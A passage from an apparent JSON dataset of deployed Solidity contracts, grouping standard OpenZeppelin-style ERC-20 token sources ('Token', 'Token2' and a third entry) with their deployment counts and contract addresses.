overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     * ```\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n\ncontract Token is ERC20 {\n    constructor(\n        string memory symbol_,\n        string memory name_,\n        uint256 totalSupply_,\n        uint256 decimals_\n    ) ERC20(name_, symbol_, decimals_) Ownable(msg.sender) {\n        _mint(msg.sender, totalSupply_ * 10 ** decimals());\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n}\n",
      "count": 3,
      "addresses": [
        "0xeA79f8F27353Bd60d1da2d4e2832D06Cb2472065",
        "0x5439A0E1B03A358498689d2147EE8163F11bf939",
        "0x51bC8D7900D840Bf0D608Ffb6070c1b4148B91d3"
      ],
      "names": [
        "Token"
      ]
    },
    {
      "id": "1b3a2695-6451-416e-ba6b-b43194c9e679",
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_, uint8 decimals_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n        // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        unchecked {\n        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        // Overflow not possible: amount <= accountBalance <= totalSupply.\n            _totalSupply -= amount;\n        }\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n}\n\ncontract Token2 is ERC20, Ownable {\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals,\n        uint256 totalSupply\n    ) ERC20(name, symbol, decimals) {\n        _mint(owner(), totalSupply);\n    }\n}\n",
      "count": 3,
      "addresses": [
        "0xc3b27f2e13133E6B484e633D9e0Ad35c29335F8F",
        "0x43c0b5d584ca3Ffa5D397Ffe2DaB93dc20E31c46",
        "0x4456c64e5b59B531c0722dE99DA40eD9a70a3Cdf"
      ],
      "names": [
        "Token2"
      ]
    },
    {
      "id": "74230f56-9a24-4a52-aa87-8bf7f1714c95",
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * The initial owner is set to the address provided by the deployer. This can\n * later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account);\n\n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\n     */\n    error OwnableInvalidOwner(address owner);\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\n     */\n    constructor(address initialOwner) {\n        if (initialOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(initialOwner);\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        if (owner() != _msgSender()) {\n            revert OwnableUnauthorizedAccount(_msgSender());\n        }\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        if (newOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n\n/**\n * @dev Standard signed math utilities missing in the Solidity language.\n */\nlibrary SignedMath {\n\n    /**\n     * @dev Returns the average of two signed numbers without overflow.\n     * The result is rounded towards zero.\n     */\n    function average(int256 a, int256 b) internal pure returns (int256) {\n        // Formula from the book \"Hacker's Delight\"\n        int256 x = (a & b) + ((a ^ b) >> 1);\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\n    }\n\n    /**\n     * @dev Returns the absolute unsigned value of a signed value.\n     */\n    function abs(int256 n) internal pure returns (uint256) {\n        unchecked {\n            // Formula from the \"Bit Twiddling Hacks\" by Sean Eron Anderson.\n            // Since `n` is a signed integer, the generated bytecode will use the SAR opcode to perform the right shift,\n            // taking advantage of the most significant (or \"sign\" bit) in two's complement representation.\n            // This opcode adds new most significant bits set to the value of the previous most significant bit. As a result,\n            // the mask will either be `bytes32(0)` (if n is positive) or `~bytes32(0)` (if n is negative).\n            int256 mask = n >> 255;\n\n            // A `bytes32(0)` mask leaves the input unchanged, while a `~bytes32(0)` mask complements it.\n            return uint256((n + mask) ^ mask);\n        }\n    }\n}\n\n\n/**\n * @dev Interface of the ERC-20 standard as defined in the ERC.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n\n/**\n * @dev Interface for the optional metadata functions from the ERC-20 standard.\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n}\n\n/**\n * @dev Standard ERC-721 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.\n */\ninterface IERC721Errors {\n    /**\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.\n     * Used in balance queries.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721InvalidOwner(address owner);\n\n    /**\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721NonexistentToken(uint256 tokenId);\n\n    /**\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param tokenId Identifier number of a token.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC721InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC721InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC721InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC721InvalidOperator(address operator);\n}\n\n/**\n * @dev Standard ERC-1155 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.\n */\ninterface IERC1155Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC1155InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC1155InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC1155MissingApprovalForAll(address operator, address owner);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC1155InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC1155InvalidOperator(address operator);\n\n    /**\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\n     * Used in batch transfers.\n     * @param idsLength Length of the array of token identifiers\n     * @param valuesLength Length of the array of token amounts\n     */\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\n}\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply 